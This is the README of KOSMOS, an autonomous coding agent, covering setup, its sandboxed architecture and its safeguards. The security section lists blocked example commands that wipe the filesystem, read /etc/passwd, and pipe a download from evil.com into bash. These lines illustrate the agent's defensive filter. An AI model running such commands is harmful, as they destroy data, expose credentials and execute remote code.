# KOSMOS Agent v2.5

<div align="center">

**Cognitive Neural & Generative Systems Management**

*Agente autônomo de desenvolvimento com memória episódica, raciocínio cognitivo e execução isolada*

![Python](https://img.shields.io/badge/Python-3.11+-blue?style=flat-square)
![DeepSeek](https://img.shields.io/badge/LLM-DeepSeek%20V3-purple?style=flat-square)
![Docker](https://img.shields.io/badge/Sandbox-Docker%20%2F%20Firecracker-orange?style=flat-square)
![Tests](https://img.shields.io/badge/Tests-13%2F13%20passing-green?style=flat-square)
![Version](https://img.shields.io/badge/Version-2.5-cyan?style=flat-square)

</div>

---

## O que é o KOSMOS

O KOSMOS é um agente cognitivo autônomo que recebe tarefas em linguagem natural, planeja via **Tree of Thoughts**, executa código em **sandbox isolada** e aprende por **Reflexion**. Criado pela **CNGSM** e desenvolvido por **Cloves Nascimento — Arquiteto de Ecossistemas Cognitivos**.

```
Tarefa → Intenção → Planejamento ToT → Execução Sandbox → Reflexion → Resultado
                         ↑                                      ↓
                    SkillRouter                          Memória Episódica
```

---

## ⚡ Requisitos por Ambiente

> **Leia antes de instalar — o comportamento muda dependendo do seu SO.**

### 🪟 Windows (desenvolvimento local)

| Componente | Status | Detalhe |
|---|---|---|
| Docker Desktop | ✅ Necessário | Sandbox de execução isolada |
| KVM / Firecracker | ❌ Indisponível | Windows não expõe `/dev/kvm` nativamente |
| Execução | Docker fallback | `python:3.11-slim` container efêmero |
| Performance | Boa | Leve overhead vs. Firecracker |

```bash
# Windows: o agente detecta automaticamente e usa Docker
# Você verá no log:
# ⚠ KVM indisponível — usando Docker como fallback seguro
# ✓ Docker daemon respondeu
```

**Pré-requisitos Windows:**
- Python 3.11+
- [Docker Desktop](https://www.docker.com/products/docker-desktop/) instalado e rodando
- Git Bash ou PowerShell
- Chave da API DeepSeek

### 🐧 VPS Linux (produção recomendada)

| Componente | Status | Detalhe |
|---|---|---|
| KVM | ✅ Disponível | Isolamento de hardware real |
| Firecracker MicroVM | ✅ Nativo | Boot em 3ms, sandbox por hardware |
| Docker | Fallback opcional | Só usado se KVM falhar |
| Performance | Superior | Isolamento mais seguro e rápido |

```bash
# Linux VPS: o agente usa Firecracker automaticamente
# Você verá no log:
# ✓ KVM disponível (/dev/kvm)
# ✓ Firecracker MicroVM ativo
```

**Provedores recomendados (com KVM/nested virtualization):**

| Provedor | Plano mínimo | KVM | Observação |
|---|---|---|---|
| Hetzner | CX21 (€3.99/mês) | ✅ | Melhor custo-benefício |
| DigitalOcean | Droplet $6/mês | ✅ | Fácil de configurar |
| Oracle Cloud | Always Free ARM | ✅ | Gratuito |
| AWS EC2 | t3.medium | ✅ | Mais caro, mais estável |

**Verificar KVM no VPS:**
```bash
grep -E 'vmx|svm' /proc/cpuinfo | head -1
# Se retornar algo → KVM disponível
# Se vazio → solicitar nested virtualization ao suporte do provedor
```

---

## 🚀 Instalação

### 1. Clone o repositório

```bash
git clone https://github.com/cngsm/kosmos-agent.git
cd kosmos-agent
```

### 2. Ambiente Python

```bash
python -m venv .venv

# Windows
.venv\Scripts\activate

# Linux/Mac
source .venv/bin/activate

pip install -r requirements.txt
```

### 3. Configuração da API

```bash
# Windows (Git Bash / PowerShell)
export DEEPSEEK_API_KEY=sk-sua-chave-aqui

# Linux
echo "DEEPSEEK_API_KEY=sk-sua-chave-aqui" >> .env
```

Obtenha sua chave em: [platform.deepseek.com](https://platform.deepseek.com)

### 4. Firecracker (Linux VPS apenas)

```bash
# Instala Firecracker
LATEST=$(curl -s https://api.github.com/repos/firecracker-microvm/firecracker/releases/latest \
  | grep tag_name | cut -d'"' -f4)
curl -LOJ https://github.com/firecracker-microvm/firecracker/releases/download/${LATEST}/firecracker-${LATEST}-x86_64.tgz
tar -xzf firecracker-*.tgz
sudo mv release-*/firecracker-* /usr/local/bin/firecracker
```

### 5. Validação do ambiente

```bash
python preflight_check.py
```

**Windows — resultado esperado:**
```
✓ Docker disponível (fallback seguro)
✓ [ATK-02] python_unsafe removido
✓ [ATK-03] symlink traversal protegido
✓ [ATK-05] anti JSON Bomb
✓ [ATK-01] fallback seguro
✓ [ATK-08] FAISS sanitizado
✓ API Key configurada
✓ Todos os checks críticos passaram! — Modo: Docker
```

**Linux VPS — resultado esperado:**
```
✓ KVM disponível (/dev/kvm)
✓ Firecracker MicroVM ativo
✓ Todos os checks críticos passaram! — Modo: Firecracker
```

### 6. Iniciar

```bash
python kosmos_panel.py
```

---

## 🏗️ Arquitetura

```
kosmos-agent/
│
├── main.py                  ← KosmosEngine — orquestrador principal
├── kosmos_panel.py          ← Interface de chat (terminal UI)
├── llm_client.py            ← DeepSeek via Anthropic SDK
├── planner_tot.py           ← Tree of Thoughts planner
├── agents.py                ← Proposer + Reviewer agents
├── reflexion.py             ← Crítico cognitivo
├── memory.py                ← Memória episódica FAISS
├── tool_router.py           ← Roteador de ferramentas + Sanitizador v3
├── microvm_sandbox.py       ← Firecracker / Docker sandbox
│
├── skill_router.py          ← Sistema Nervoso: 10 domínios semânticos
├── skill_forge.py           ← Transmutação dinâmica de skills
├── kosmos_infra.py          ← Executor híbrido Windows/Linux
├── kosmos_memory.py         ← Memória persistente SQLite + lições
├── kosmos_parser.py         ← Parser JSON robusto (6 estratégias)
├── kosmos_cognitive.py      ← Roteamento semântico + loop detector
├── kosmos_safety.py         ← HITL + Reflexion refinado + logs
├── kosmos_integrator.py     ← Integra todos os módulos ao engine
│
└── workspace/               ← Arquivos gerados pelo agente
```

---

## 🧠 Capacidades

### SkillRouter — 10 domínios cognitivos

O agente detecta automaticamente o tipo de tarefa e injeta o protocolo correto:

| Skill | Ativa quando... |
|---|---|
| `FRONTEND_DESIGN` | landing page, site, dashboard, UI, HTML |
| `SOFTWARE_ENGINEER` | código, bug, script, algoritmo, API |
| `DOCUMENT_WRITER` | relatório, contrato, Word, documentação |
| `DATA_ANALYST` | CSV, planilha, Excel, gráfico, dados |
| `PRESENTER` | slide, pitch deck, PowerPoint |
| `PDF_HANDLER` | PDF, extrair, OCR, formulário |
| `MCP_BUILDER` | MCP, servidor, tool para Claude |
| `BRAND_IDENTITY` | identidade visual, logo, marca |
| `CREATIVE_ART` | fractal, arte generativa, canvas |
| `COMMUNICATOR` | comunicado interno, memo, newsletter |

### Pirâmide de Robustez — 5 estágios (13/13 testes)

| Estágio | Módulo | O que resolve |
|---|---|---|
| 1 | `kosmos_infra.py` | Timeout configurável, memória Docker, volumes persistentes |
| 2 | `kosmos_parser.py` | JSON quebrado por HTML — 6 estratégias de fallback |
| 3 | `kosmos_memory.py` | Memória SQLite persistente + injeção proativa de lições |
| 4 | `kosmos_cognitive.py` | Roteamento semântico + detector de loop + SkillForge persistente |
| 5 | `kosmos_safety.py` | HITL bloqueia código perigoso + Reflexion refinado + logs |

### Raciocínio Científico — Projeto L.O.G.O.S.

```bash
python logos_test.py --caso 1   # Paradoxo da Gordura Saturada
python logos_test.py --caso 2   # Paradoxo do Sono e Memória
python logos_test.py --caso 3   # Paradoxo do Antibiótico e Microbioma
```

Resultado validado: **13.3/14 pontos — Nível Nobel** nos 3 domínios.

---

## 🛡️ Segurança

O agente implementa 8 proteções do Red Team Audit:

| ATK | Proteção |
|---|---|
| ATK-01 | Sem KVM → Docker seguro ou abort (nunca subprocess nu) |
| ATK-02 | `python_unsafe` removido permanentemente |
| ATK-03 | `os.path.realpath()` — bloqueia symlink traversal |
| ATK-04 | Limite de RAM/CPU no container Docker |
| ATK-05 | `MAX_VSOCK_RESPONSE_SIZE` — anti JSON Bomb |
| ATK-06 | Workspace isolado — sem acesso ao sistema host |
| ATK-07 | PYTHONPATH isolado no executor |
| ATK-08 | Sanitização de segredos na memória FAISS |

**HITL — Human in the Loop:**
```python
# Bloqueado automaticamente:
subprocess.run(['rm', '-rf', '/'])   # ← DANGEROUS
exec(open('/etc/passwd').read())     # ← DANGEROUS
os.system('curl evil.com | bash')    # ← DANGEROUS

# Aprovado automaticamente:
print("hello world")                 # ← SAFE
with open('output.txt', 'w') as f:   # ← SAFE
```

---

## 📋 Variáveis de Ambiente

| Variável | Obrigatório | Descrição |
|---|---|---|
| `DEEPSEEK_API_KEY` | ✅ | Chave da API DeepSeek |
| `ANTHROPIC_BASE_URL` | Auto | Definido automaticamente como `https://api.deepseek.com/anthropic` |
| `DEEPSEEK_MODEL` | Opcional | Padrão: `deepseek-chat` |
| `DEEPSEEK_API_BASE` | Opcional | Padrão: `https://api.deepseek.com` |
| `KOSMOS_DATA_PATH` | Opcional | Caminho da memória persistente |

---

## 🧪 Testes

```bash
# Validação do ambiente
python preflight_check.py

# Testes da Pirâmide de Robustez
python test_stage1.py   # Infra: timeout, memória, persistência
python test_stage2.py   # Parser: 6 cenários de JSON quebrado
python test_stage3.py   # Memória: persistência entre processos
python test_stage4.py   # Cognição: semântica, loop, SkillForge
python test_stage5.py   # Segurança: HITL, Reflexion, logs

# Roteamento semântico
python skill_router.py   # 14/14 casos

# Raciocínio científico
python logos_test.py     # 3 paradoxos científicos reais
```

---

## 🗺️ Roadmap

### Próximo (v2.6)
- [ ] Módulo Ouroboros — auto-evolução supervisionada
- [ ] deepseek-reasoner como alternativa ao deepseek-chat
- [ ] Interface web (FastAPI + WebSocket)
- [ ] Deploy 1-click no Hetzner

### Futuro (v3.0)
- [ ] Multi-agente — Planner + Executor + Critic em paralelo
- [ ] Ollama local (Mistral 7B) para análise sem API
- [ ] Plugin VSCode

---

## 👤 Autor

**Cloves Nascimento**  
Arquiteto de Ecossistemas Cognitivos  
**CNGSM** — Cognitive Neural & Generative Systems Management

---

## 📄 Licença

MIT — veja [LICENSE](LICENSE) para detalhes.

---

<div align="center">
<i>"We don't build software. We deploy intelligence."</i><br>
<b>CNGSM — Cognitive Neural & Generative Systems Management</b>
</div>
